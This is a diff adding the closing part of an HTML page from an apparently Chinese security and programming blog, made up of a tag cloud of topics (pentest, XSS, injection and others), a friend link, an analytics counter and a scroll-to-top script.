+            <a href="http://wyb0.com/tags/paramiko" title="paramiko" style="background-color:#23b7e5;color:#080808;line-height:25px;">paramiko<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/pentest" title="pentest" style="background-color:#23b7e5;color:#080808;line-height:25px;">pentest<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/php" title="php" style="background-color:#23b7e5;color:#080808;line-height:25px;">php<sup>13</sup></a>
+        
+            <a href="http://wyb0.com/tags/php-fpm" title="php-fpm" style="background-color:#23b7e5;color:#080808;line-height:25px;">php-fpm<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/pip" title="pip" style="background-color:#23b7e5;color:#080808;line-height:25px;">pip<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/plan" title="plan" style="background-color:#23b7e5;color:#080808;line-height:25px;">plan<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/poc" title="poc" style="background-color:#23b7e5;color:#080808;line-height:25px;">poc<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/pptp" title="pptp" style="background-color:#23b7e5;color:#080808;line-height:25px;">pptp<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/proxifier" title="proxifier" style="background-color:#23b7e5;color:#080808;line-height:25px;">proxifier<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/pyfiglet" title="pyfiglet" style="background-color:#23b7e5;color:#080808;line-height:25px;">pyfiglet<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/python" title="python" style="background-color:#23b7e5;color:#080808;line-height:25px;">python<sup>30</sup></a>
+        
+            <a href="http://wyb0.com/tags/python%e5%ae%9e%e7%8e%b0" title="python实现" style="background-color:#23b7e5;color:#080808;line-height:25px;">python实现<sup>7</sup></a>
+        
+            <a href="http://wyb0.com/tags/python%e6%a8%a1%e5%9d%97" title="python模块" style="background-color:#23b7e5;color:#080808;line-height:25px;">python模块<sup>10</sup></a>
+        
+            <a href="http://wyb0.com/tags/redis" title="redis" style="background-color:#23b7e5;color:#080808;line-height:25px;">redis<sup>2</sup></a>
+        
+            <a href="http://wyb0.com/tags/requests" title="requests" style="background-color:#23b7e5;color:#080808;line-height:25px;">requests<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/scapy" title="scapy" style="background-color:#23b7e5;color:#080808;line-height:25px;">scapy<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/sed" title="sed" style="background-color:#23b7e5;color:#080808;line-height:25px;">sed<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/set" title="set" style="background-color:#23b7e5;color:#080808;line-height:25px;">set<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/setuptools" title="setuptools" style="background-color:#23b7e5;color:#080808;line-height:25px;">setuptools<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/shadowsocks" title="shadowsocks" style="background-color:#23b7e5;color:#080808;line-height:25px;">shadowsocks<sup>2</sup></a>
+        
+            <a href="http://wyb0.com/tags/shell" title="shell" style="background-color:#23b7e5;color:#080808;line-height:25px;">shell<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/sqblime-text" title="sqblime-text" style="background-color:#23b7e5;color:#080808;line-height:25px;">sqblime-text<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/sqlmap" title="sqlmap" style="background-color:#23b7e5;color:#080808;line-height:25px;">sqlmap<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/sqlmapapi" title="sqlmapapi" style="background-color:#23b7e5;color:#080808;line-height:25px;">sqlmapapi<sup>2</sup></a>
+        
+            <a href="http://wyb0.com/tags/ssh" title="ssh" style="background-color:#23b7e5;color:#080808;line-height:25px;">ssh<sup>2</sup></a>
+        
+            <a href="http://wyb0.com/tags/ssrf" title="ssrf" style="background-color:#23b7e5;color:#080808;line-height:25px;">ssrf<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/tar" title="tar" style="background-color:#23b7e5;color:#080808;line-height:25px;">tar<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/termcolor" title="termcolor" style="background-color:#23b7e5;color:#080808;line-height:25px;">termcolor<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/theharvester" title="theharvester" style="background-color:#23b7e5;color:#080808;line-height:25px;">theharvester<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/tmux" title="tmux" style="background-color:#23b7e5;color:#080808;line-height:25px;">tmux<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/tomcat" title="tomcat" style="background-color:#23b7e5;color:#080808;line-height:25px;">tomcat<sup>2</sup></a>
+        
+            <a href="http://wyb0.com/tags/tornado" title="tornado" style="background-color:#23b7e5;color:#080808;line-height:25px;">tornado<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/tuple" title="tuple" style="background-color:#23b7e5;color:#080808;line-height:25px;">tuple<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/ubuntu" title="ubuntu" style="background-color:#23b7e5;color:#080808;line-height:25px;">ubuntu<sup>6</sup></a>
+        
+            <a href="http://wyb0.com/tags/vim" title="vim" style="background-color:#23b7e5;color:#080808;line-height:25px;">vim<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/vm-tools" title="vm-tools" style="background-color:#23b7e5;color:#080808;line-height:25px;">vm-tools<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/vpn" title="vpn" style="background-color:#23b7e5;color:#080808;line-height:25px;">vpn<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/web%e5%b8%b8%e8%a7%81%e6%bc%8f%e6%b4%9e" title="web常见漏洞" style="background-color:#23b7e5;color:#080808;line-height:25px;">web常见漏洞<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/win" title="win" style="background-color:#23b7e5;color:#080808;line-height:25px;">win<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/windows" title="windows" style="background-color:#23b7e5;color:#080808;line-height:25px;">windows<sup>5</sup></a>
+        
+            <a href="http://wyb0.com/tags/wireless" title="wireless" style="background-color:#23b7e5;color:#080808;line-height:25px;">wireless<sup>2</sup></a>
+        
+            <a href="http://wyb0.com/tags/wordpress" title="wordpress" style="background-color:#23b7e5;color:#080808;line-height:25px;">wordpress<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/xml" title="xml" style="background-color:#23b7e5;color:#080808;line-height:25px;">xml<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/xss" title="xss" style="background-color:#23b7e5;color:#080808;line-height:25px;">xss<sup>3</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e4%b8%8a%e4%bc%a0" title="上传" style="background-color:#23b7e5;color:#080808;line-height:25px;">上传<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e4%b8%8b%e8%bd%bd" title="下载" style="background-color:#23b7e5;color:#080808;line-height:25px;">下载<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e4%ba%8c%e7%ba%a7%e5%9f%9f%e5%90%8d" title="二级域名" style="background-color:#23b7e5;color:#080808;line-height:25px;">二级域名<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e4%ba%a4%e6%8d%a2%e6%9c%ba" title="交换机" style="background-color:#23b7e5;color:#080808;line-height:25px;">交换机<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e4%bb%a3%e7%90%86" title="代理" style="background-color:#23b7e5;color:#080808;line-height:25px;">代理<sup>2</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c" title="代码执行" style="background-color:#23b7e5;color:#080808;line-height:25px;">代码执行<sup>2</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e6%9f%a5%e7%9c%8b%e4%b8%8e%e4%b8%8b%e8%bd%bd%e6%bc%8f%e6%b4%9e" title="任意文件查看与下载漏洞" style="background-color:#23b7e5;color:#080808;line-height:25px;">任意文件查看与下载漏洞<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e4%bf%a1%e6%81%af%e6%b3%84%e6%bc%8f" title="信息泄漏" style="background-color:#23b7e5;color:#080808;line-height:25px;">信息泄漏<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e5%87%bd%e6%95%b0" title="函数" style="background-color:#23b7e5;color:#080808;line-height:25px;">函数<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e5%87%bd%e6%95%b0%e5%bc%8f%e7%bc%96%e7%a8%8b" title="函数式编程" style="background-color:#23b7e5;color:#080808;line-height:25px;">函数式编程<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e5%88%86%e5%8c%ba" title="分区" style="background-color:#23b7e5;color:#080808;line-height:25px;">分区<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e5%8e%8b%e7%bc%a9" title="压缩" style="background-color:#23b7e5;color:#080808;line-height:25px;">压缩<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e5%8f%82%e6%95%b0%e7%b1%bb%e5%9e%8b" title="参数类型" style="background-color:#23b7e5;color:#080808;line-height:25px;">参数类型<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" title="反序列化" style="background-color:#23b7e5;color:#080808;line-height:25px;">反序列化<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e5%90%8e%e9%97%a8" title="后门" style="background-color:#23b7e5;color:#080808;line-height:25px;">后门<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" title="命令执行" style="background-color:#23b7e5;color:#080808;line-height:25px;">命令执行<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e5%9f%ba%e7%a1%80%e5%91%bd%e4%bb%a4" title="基础命令" style="background-color:#23b7e5;color:#080808;line-height:25px;">基础命令<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e5%a4%9a%e7%ba%bf%e7%a8%8b" title="多线程" style="background-color:#23b7e5;color:#080808;line-height:25px;">多线程<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e5%ad%97%e7%ac%a6%e4%b8%b2" title="字符串" style="background-color:#23b7e5;color:#080808;line-height:25px;">字符串<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e5%af%86%e7%a0%81" title="密码" style="background-color:#23b7e5;color:#080808;line-height:25px;">密码<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e5%b1%80%e5%9f%9f%e7%bd%91" title="局域网" style="background-color:#23b7e5;color:#080808;line-height:25px;">局域网<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e5%b8%83%e5%b0%94%e5%9e%8b%e6%b3%a8%e5%85%a5" title="布尔型注入" style="background-color:#23b7e5;color:#080808;line-height:25px;">布尔型注入<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e5%bc%80%e6%9c%ba%e8%87%aa%e5%90%af" title="开机自启" style="background-color:#23b7e5;color:#080808;line-height:25px;">开机自启<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e5%bc%82%e5%b8%b8%e5%a4%84%e7%90%86" title="异常处理" style="background-color:#23b7e5;color:#080808;line-height:25px;">异常处理<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e6%8a%a5%e9%94%99%e6%b3%a8%e5%85%a5" title="报错注入" style="background-color:#23b7e5;color:#080808;line-height:25px;">报错注入<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e6%8f%90%e6%9d%83" title="提权" style="background-color:#23b7e5;color:#080808;line-height:25px;">提权<sup>5</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e6%8f%92%e4%bb%b6" title="插件" style="background-color:#23b7e5;color:#080808;line-height:25px;">插件<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e6%95%b0%e6%8d%ae%e5%ba%93" title="数据库" style="background-color:#23b7e5;color:#080808;line-height:25px;">数据库<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e6%95%b0%e7%bb%84" title="数组" style="background-color:#23b7e5;color:#080808;line-height:25px;">数组<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e6%96%87%e4%bb%b6" title="文件" style="background-color:#23b7e5;color:#080808;line-height:25px;">文件<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" title="文件上传" style="background-color:#23b7e5;color:#080808;line-height:25px;">文件上传<sup>4</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" title="文件包含" style="background-color:#23b7e5;color:#080808;line-height:25px;">文件包含<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e6%96%87%e6%9c%ac%e5%a4%84%e7%90%86" title="文本处理" style="background-color:#23b7e5;color:#080808;line-height:25px;">文本处理<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e6%96%87%e6%9c%ac%e7%bc%96%e8%be%91%e5%99%a8" title="文本编辑器" style="background-color:#23b7e5;color:#080808;line-height:25px;">文本编辑器<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e6%9c%8d%e5%8a%a1" title="服务" style="background-color:#23b7e5;color:#080808;line-height:25px;">服务<sup>2</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae" title="未授权访问" style="background-color:#23b7e5;color:#080808;line-height:25px;">未授权访问<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e6%9d%83%e9%99%90" title="权限" style="background-color:#23b7e5;color:#080808;line-height:25px;">权限<sup>2</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e6%a1%86%e6%9e%b6" title="框架" style="background-color:#23b7e5;color:#080808;line-height:25px;">框架<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e6%a8%a1%e5%9d%97" title="模块" style="background-color:#23b7e5;color:#080808;line-height:25px;">模块<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e6%ad%a3%e5%88%99" title="正则" style="background-color:#23b7e5;color:#080808;line-height:25px;">正则<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e6%b3%a8%e5%85%a5" title="注入" style="background-color:#23b7e5;color:#080808;line-height:25px;">注入<sup>8</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e6%b5%81%e7%a8%8b" title="渗透测试流程" style="background-color:#23b7e5;color:#080808;line-height:25px;">渗透测试流程<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e7%88%86%e7%a0%b4" title="爆破" style="background-color:#23b7e5;color:#080808;line-height:25px;">爆破<sup>3</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e7%94%a8%e6%88%b7%e7%bb%84" title="用户组" style="background-color:#23b7e5;color:#080808;line-height:25px;">用户组<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e7%9b%ae%e5%bd%95" title="目录" style="background-color:#23b7e5;color:#080808;line-height:25px;">目录<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" title="端口转发" style="background-color:#23b7e5;color:#080808;line-height:25px;">端口转发<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e7%bb%95%e8%bf%87%e4%b8%8a%e4%bc%a0" title="绕过上传" style="background-color:#23b7e5;color:#080808;line-height:25px;">绕过上传<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e7%bc%96%e7%a0%81" title="编码" style="background-color:#23b7e5;color:#080808;line-height:25px;">编码<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e7%bd%91%e7%bb%9c%e6%90%ad%e5%bb%ba" title="网络搭建" style="background-color:#23b7e5;color:#080808;line-height:25px;">网络搭建<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e7%bd%91%e7%bb%9c%e9%85%8d%e7%bd%ae" title="网络配置" style="background-color:#23b7e5;color:#080808;line-height:25px;">网络配置<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e8%81%94%e5%90%88%e6%9f%a5%e8%af%a2" title="联合查询" style="background-color:#23b7e5;color:#080808;line-height:25px;">联合查询<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e8%99%9a%e6%8b%9f%e4%b8%bb%e6%9c%ba" title="虚拟主机" style="background-color:#23b7e5;color:#080808;line-height:25px;">虚拟主机<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e8%99%9a%e6%8b%9f%e6%9c%ba" title="虚拟机" style="background-color:#23b7e5;color:#080808;line-height:25px;">虚拟机<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1" title="计划任务" style="background-color:#23b7e5;color:#080808;line-height:25px;">计划任务<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e8%bd%af%e4%bb%b6" title="软件" style="background-color:#23b7e5;color:#080808;line-height:25px;">软件<sup>12</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e8%bd%af%e4%bb%b6%e5%ae%89%e8%a3%85" title="软件安装" style="background-color:#23b7e5;color:#080808;line-height:25px;">软件安装<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e" title="逻辑漏洞" style="background-color:#23b7e5;color:#080808;line-height:25px;">逻辑漏洞<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e9%85%8d%e7%bd%ae" title="配置" style="background-color:#23b7e5;color:#080808;line-height:25px;">配置<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e9%87%8d%e5%ae%9a%e5%90%91" title="重定向" style="background-color:#23b7e5;color:#080808;line-height:25px;">重定向<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e9%9d%a2%e5%90%91%e5%af%b9%e8%b1%a1" title="面向对象" style="background-color:#23b7e5;color:#080808;line-height:25px;">面向对象<sup>2</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e9%a2%9c%e8%89%b2" title="颜色" style="background-color:#23b7e5;color:#080808;line-height:25px;">颜色<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/%e9%ab%98%e9%98%b6%e5%87%bd%e6%95%b0" title="高阶函数" style="background-color:#23b7e5;color:#080808;line-height:25px;">高阶函数<sup>1</sup></a>
+        
+        </div>
+</div>
+
+
+
+                <h2 style="font-size:1.3em;color:#2ca6cb;padding:0 0 .3125em 0;border-bottom:.1875em solid #ccc;">友链</h2>
+<ul style="padding:0px 0px 5px 0px;">
+    <li style="list-style-type:none;line-height:15px;">
+        <a href="http://www.test404.com/">&nbsp;&nbsp;Test404's Blog</a>
+    </li>
+</ul>
+            </div>
+        </div>
+    </div>
+
+    <br>
+    
+<div class="foot">
+    <div style="float:left;text-align: center;">
+        
+        &copy; 2016-2017 Reber. All Rights Reserved.
+
+        
+        <script type="text/javascript">
+          var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+          document.write(unescape("%3Cspan id='cnzz_stat_icon_1261003390'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s11.cnzz.com/z_stat.php%3Fid%3D1261003390%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));
+        </script>
+    </div>
+    <div style="float:right;">
+        
+        
+            <a href="https://github.com/reber-9" target="_blank"><i class="fa fa-github-square fa-fw"></i>GitHub</a>
+        
+        &nbsp;&nbsp;
+        
+            <a href="http://weibo.com/u/5819760166" target="_blank"><i class="fa fa-weibo fa-fw"></i>Weibo</a>
+        
+        &nbsp;&nbsp;
+        <a href="http://wyb0.com/index.xml" target="_blank"><i class="fa fa-rss fa-fw"></i>RSS</a>
+    </div>
+</div>
+</div>
+
+    
+    <div style="width:20px;height:20px;position:fixed;right:50px;bottom:50px;">
+      <a href="#top" id="goToTop">
+        <img src="http://wyb0.com/img/goto_top.png" alt="可以返回顶部" title="回到顶部"  style="display:block;" />
+      </a>
+    </div>
+
+    <script type="text/javascript">
+    $.fn.goToTop = function () {
+        if ($(window).scrollTop()<400) {
+            $('#goToTop').hide(); 
+        }
+        $(window).scroll(function () {
+            if ($(this).scrollTop()>400) {
+                $('#goToTop').fadeIn();
+            } else {
+                $('#goToTop').fadeOut();
+            }
+        });
+        this.click(function () {
+            $('html,body').animate({scrollTop:0},800);
+            return false;
+        });
+    }
+
+    $(document).ready(function () {
+        $('#goToTop').goToTop();
+    });
+    </script>
+
+    <script src="http://wyb0.com/js/ui.js"></script>
+
+</body>
+</html>
+
